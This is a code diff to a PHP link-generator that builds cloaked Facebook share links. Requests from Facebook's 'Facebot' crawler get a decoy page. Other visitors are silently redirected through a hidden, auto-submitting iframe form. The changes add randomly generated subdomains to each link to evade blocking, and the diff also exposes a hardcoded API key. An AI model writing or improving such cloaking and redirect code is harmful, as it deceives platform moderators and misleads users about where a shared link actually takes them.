@@ -123,9 +123,9 @@ if ($_POST["url"]) {
     $minhHtml = './minh/' . $pathname . ".html";
     $phucHtml = './phuc/' . $pathname . ".html";
 
-    $tuUrl = $tuDomain . '/tu/' . $pathname . ".html";
-    $minhUrl = $minhDomain . '/minh/' . $pathname . ".html";
-    $phucUrl = $phucDomain . '/phuc/' . $pathname . ".html";
+    $tuUrl = substr(md5(microtime()), rand(0, 26), 10) . '.' . $tuDomain . '/tu/' . $pathname . ".html";
+    $minhUrl = substr(md5(microtime()), rand(0, 26), 10) . '.' . $minhDomain . '/minh/' . $pathname . ".html";
+    $phucUrl = substr(md5(microtime()), rand(0, 26), 10) . '.' . $phucDomain . '/phuc/' . $pathname . ".html";
 
     $fakeLink = $_POST['fake_link'];
     $mainLink = $_POST['url'] . '/?utm_source=' . $_POST['user'] . '&utm_medium=Facebook';
@@ -136,16 +136,16 @@ if ($_POST["url"]) {
     $fPhucHtml = fopen($phucHtml, 'w');
     $fFakeLink = fopen($fakeLinkHtml, 'w');
 
-    $htmlString = "
-    <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
-  <html xmlns=\"http://www.w3.org/1999/xhtml\">
+    $htmlString = '
+    <!DOCTYPE html PUBLIC \\"-//W3C//DTD XHTML 1.0 Transitional//EN\\" \\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\">
+  <html xmlns=\\"http://www.w3.org/1999/xhtml\\">
   <head>
-  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">
+  <meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=utf-8\\">
   <title></title>
-  <meta property=\"fb:app_id\" content=\"\">
-  <meta property=\"og:site_name\" content=\"......\">
-  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
-  <meta name=\"robots\" content=\"noindex,nofollow\">
+  <meta property=\\"fb:app_id\\" content=\\"\\">
+  <meta property=\\"og:site_name\\" content=\\"......\\">
+  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1\\">
+  <meta name=\\"robots\\" content=\\"noindex,nofollow\\">
   <style>
   *{
   text-align: center;
@@ -156,14 +156,14 @@ if ($_POST["url"]) {
 
   <script>
   function go() {
-  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"get\" action=\"$tuUrl\";></form>';
+  window.frames[0].document.body.innerHTML = \'<form target=\\"_parent\\" method=\\"get\\" action=\\"' . $tuUrl . '\\";></form>\';
   window.frames[0].document.forms[0].submit();
   }
   </script>
-  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
+  <iframe onload=\\"window.setTimeout(\'go()\', 0)\\" src=\\"about:blank\\" style=\\"visibility:hidden\\"></iframe>
   </body>
   </html>
-    ";
+    ';
     $htmlTu = "
 <html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"vi\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\">
 <head>
@@ -289,9 +289,10 @@ if (
     strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
 ) {
    echo "' . $facebookCheat . '";
+   die();
  }
 else {
-header("Location: ' . $fileHtml . '", true, 301);
+  echo "' . $htmlString . '";
 die();
 }
 ?>
@@ -301,7 +302,7 @@ die();
     fclose($fphp);
     // echo "Link share: " . "<a href ='$filePhp'>" . $filePhp . "</a>";
     // $lurl = 'http://' . substr(md5(microtime()), rand(0, 26), 10) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
-    $lurl = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
+    $lurl = 'http://' . substr(md5(microtime()), rand(0, 26), 10) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
     $curl = curl_init();
     $post_data = array('format' => 'text',
         'apikey' => '85D97C460CDBCAEBIB5A',
